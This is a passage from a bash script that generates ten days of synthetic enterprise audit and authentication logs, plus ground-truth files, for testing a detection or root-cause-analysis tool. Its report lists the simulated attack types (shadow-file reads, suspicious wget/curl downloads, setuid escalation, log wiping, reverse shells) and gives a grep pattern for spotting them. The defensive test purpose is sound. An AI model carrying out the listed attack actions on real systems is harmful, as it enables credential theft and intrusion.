□ Normal database operations by DBAs not flagged
□ Regular development activities not flagged
□ Authorized security scanning not flagged
□ Business hour activity patterns recognized as normal

CORRELATION TESTS:
□ Related events properly grouped together
□ Attack sequences identified correctly
□ User behavior patterns established
□ Temporal analysis shows business hour concentration
□ Insider threat scenarios detected (some malicious acts by real users)

PERFORMANCE BENCHMARKS:
□ Processes all logs within reasonable time (<5 minutes)
□ Memory usage remains stable during processing
□ Can handle 1000+ log entries efficiently
□ Output is clear and actionable

ACCURACY TARGETS:
- Detection Rate: >90% of known malicious activities
- False Positive Rate: <10% of legitimate activities
- Processing Speed: >200 log entries per second
- Memory Usage: <500MB for full dataset

SCORING:
16-20 passed: Excellent RCA capability
12-15 passed: Good RCA capability  
8-11 passed: Fair RCA capability needs improvement
<8 passed: Poor RCA capability needs significant work

EOF
    
    log_info "Ground truth documentation created"
}

# Create final report
create_final_report() {
    log_info "Creating final simulation report..."
    
    local report_file="${BASE_DIR}/SIMULATION_REPORT.txt"
    local total_audit=$(wc -l < "${BASE_DIR}/logs/aggregate/all_audit_logs.log" 2>/dev/null || echo "0")
    local total_auth=$(wc -l < "${BASE_DIR}/logs/aggregate/all_auth_logs.log" 2>/dev/null || echo "0")
    local total_logs=$((total_audit + total_auth))
    
    cat > "$report_file" << EOF
##############################################################################
#                   ENTERPRISE MNC AUDIT LOG SIMULATION                     #
#                         FINAL REPORT                                      #
##############################################################################

Generated: $(date)
Duration: 10 days of historical data
Location: $BASE_DIR
Total Logs: $total_logs entries ($total_audit audit + $total_auth auth)

SIMULATION SUMMARY:
==================
✓ 10 enterprise users across 5 roles created
✓ Realistic directory structure with proper permissions
✓ $total_logs log entries generated across 10 days
✓ Mix of legitimate business activities and security incidents  
✓ Proper timestamp distribution (not bunched up)
✓ Comprehensive audit rules configured (if run as root)
✓ Ground truth documentation for RCA validation

DIRECTORY STRUCTURE:
===================
$SIM_NAME/
├── logs/
│   ├── daily/day_01/ to day_10/    # Individual day logs
│   ├── aggregate/                   # Combined logs + CSV exports  
│   └── ground_truth/                # Validation documentation
├── enterprise_data/                 # Business data (HR, Finance, Dev, Ops, DB)
├── applications/                    # Application directories
├── system/                         # System configs and logs
└── home/                           # User home directories

KEY FILES FOR ANALYSIS:
======================
Primary Logs:
- logs/aggregate/all_audit_logs.log  # Combined audit events
- logs/aggregate/all_auth_logs.log   # Combined auth events  
- logs/aggregate/*.csv               # CSV format for tools

Validation:
- logs/ground_truth/malicious_activities.txt    # Known bad events
- logs/ground_truth/legitimate_activities.txt   # Known good events
- logs/ground_truth/rca_validation_checklist.txt # Testing guide

Daily Breakdown:
- logs/daily/day_XX/audit.log       # Per-day audit events
- logs/daily/day_XX/auth.log        # Per-day auth events
- logs/daily/day_XX/summary.txt     # Daily statistics

USERS AND ROLES:
===============
Sysadmins: alice, dave (system monitoring, config access)
DBAs: bob, eve (database operations, backups)  
Developers: carol, frank, john (code, builds, deployments)
Operations: grace, sarah (monitoring, backups, maintenance)
Security: heidi (auditing, scanning, incident response)

SECURITY EVENTS INCLUDED:
========================
Malicious Activities (~100 events total):
- Password file access attempts (/etc/passwd, /etc/shadow)
- Brute force login attacks from external IPs
- Network reconnaissance (nmap, port scanning)
- Malicious file downloads (wget/curl suspicious domains)
- Privilege escalation attempts (chmod +s, sudo abuse)
- Log tampering (history clearing, log deletion)
- Reverse shell attempts

Legitimate Activities (~900 events total):
- Role-appropriate system administration
- Database maintenance and monitoring
- Software development and deployment  
- Infrastructure operations and monitoring
- Security auditing and compliance

VALIDATION COMMANDS:
===================
Count malicious events:
grep -c "passwd\|shadow\|malicious\|wget.*bad" logs/aggregate/all_audit_logs.log

Count failed logins:  
grep -c "Failed password" logs/aggregate/all_auth_logs.log

Count by user role:
grep "alice\|dave" logs/aggregate/all_audit_logs.log | wc -l  # sysadmins
grep "bob\|eve" logs/aggregate/all_audit_logs.log | wc -l     # DBAs

USAGE INSTRUCTIONS:
==================
1. Load logs into your RCA tool from: logs/aggregate/
2. Import CSV files for advanced analysis: *.csv  
3. Test detection using ground truth: logs/ground_truth/
4. Validate against checklist: rca_validation_checklist.txt
5. Compare results with known malicious/legitimate activities

NEXT STEPS:
===========
1. Point your RCA tool to: $BASE_DIR/logs/aggregate/
2. Import all_audit_logs.log and all_auth_logs.log
3. Run your analysis and detection algorithms
4. Compare findings with ground truth documentation
5. Use validation checklist to score your tool's performance

STATUS: ✅ SIMULATION COMPLETE AND READY FOR ANALYSIS

##############################################################################
EOF
    
    log_info "Final report created: $report_file"
}

# Main execution function
main() {
    echo "##############################################################################"
    echo "#                   ENTERPRISE MNC AUDIT LOG SIMULATOR                      #"
    echo "##############################################################################"
    echo
    
    log_info "Starting Enterprise MNC Audit Log Simulation..."
    log_info "Simulation name: $SIM_NAME"
    log_info "Base directory: $BASE_DIR"
    echo
    
    # Check prerequisites
    check_root
    
    # Create environment
    log_info "=== PHASE 1: Environment Setup ==="
    create_directory_structure
    setup_user_config
    create_users_and_groups
    set_directory_permissions
    create_sample_data
    configure_audit_rules
    echo
    
    # Generate simulation data
    log_info "=== PHASE 2: Log Generation ==="
    log_info "Generating 10 days of audit and authentication logs..."
    
    for day in {1..10}; do
        simulate_day_activities "$day"
    done
    echo
    
    # Post-processing
    log_info "=== PHASE 3: Aggregation and Documentation ==="
    aggregate_logs
    create_ground_truth
    create_final_report
    echo
    
    # Final statistics and summary
    local total_audit=$(wc -l < "${BASE_DIR}/logs/aggregate/all_audit_logs.log" 2>/dev/null || echo "0")
    local total_auth=$(wc -l < "${BASE_DIR}/logs/aggregate/all_auth_logs.log" 2>/dev/null || echo "0")
    local total_logs=$((total_audit + total_auth))
    
    echo "##############################################################################"
    log_info "🎉 SIMULATION COMPLETED SUCCESSFULLY! 🎉"
    echo "##############################################################################"
    echo
    log_info "📊 FINAL STATISTICS:"
    echo "   • Total log entries: $total_logs"
    echo "   • Audit events: $total_audit" 
    echo "   • Auth events: $total_auth"
    echo "   • Time period: 10 days"
    echo "   • Users simulated: 10 (across 5 roles)"
    echo
    log_info "📁 SIMULATION LOCATION:"
    echo "   • Base directory: $BASE_DIR"
    echo "   • Main logs: $BASE_DIR/logs/aggregate/"
    echo "   • Daily logs: $BASE_DIR/logs/daily/"
    echo "   • Validation: $BASE_DIR/logs/ground_truth/"
    echo
    log_info "🚀 NEXT STEPS:"
    echo "   1. Review: $BASE_DIR/SIMULATION_REPORT.txt"
    echo "   2. Analyze: $BASE_DIR/logs/aggregate/all_*.log"  
    echo "   3. Import: $BASE_DIR/logs/aggregate/*.csv"
    echo "   4. Validate: $BASE_DIR/logs/ground_truth/"
    echo
    log_info "✅ Ready for AI-powered RCA analysis!"
    echo "##############################################################################"
}

# Set error handling
set +e  # Don't exit on errors, but handle them gracefully
trap 'log_error "Script encountered an error at line $LINENO. Check permissions and try again."' ERR

# Run main function
main "$@"
